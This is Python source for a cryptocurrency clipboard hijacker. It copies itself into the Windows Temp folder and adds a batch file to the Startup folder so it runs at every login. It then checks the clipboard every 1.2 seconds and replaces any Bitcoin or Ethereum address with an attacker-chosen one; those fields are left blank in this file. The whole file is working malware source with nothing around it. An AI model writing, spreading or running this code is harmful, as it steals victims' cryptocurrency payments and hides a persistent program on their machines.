import sys, re
import getpass;user=getpass.getuser()
import os
from pyperclip import copy, paste
from time import sleep

class Startup:

    def __init__(self):
        self.file = sys.argv[0]
        ext = self.file.split("\\")[-1].split(".")[-1]
        name = self.file.split("\\")[-1].split(".")[0]
        self._startup(ext,name)

    def _startup(self,e,n):
        try:
            if os.path.exists(f'C:\\Users\\{user}\\AppData\\Local\\Temp\\{n}.{e}'):
                pass
            else:
                with open(f'C:\\Users\\{user}\\AppData\\Local\\Temp\\{n}.{e}', 'wb') as f:
                    f.write(open(self.file, 'rb').read())
                open(f"C:\\Users\\{user}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\runn.bat","w+").write(fr"""start C:\\Users\\{user}\\AppData\\Local\\Temp\\{n}.{e}""")
        except:pass

class CLIPPAR:

    def __init__(self):
        self.BAYTEECEE = ""
        self.ETHH = ""
        self.__clap__()
    
    def __clap__(self):
        while True:
            sleep(1.2)
            p4ste = str(paste())
            btc_check = re.match("^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$", p4ste)
            btc_match = bool(btc_check)
            eth_check = re.match("^0x[a-zA-F0-9]{40}$", p4ste)
            eth_match = bool(eth_check)
            if btc_match:
                if len(self.BAYTEECEE) > 1:
                    copy(self.BAYTEECEE)
            if eth_match:
                if len(self.ETHH) > 1:
                    copy(self.ETHH)
Startup()
CLIPPAR()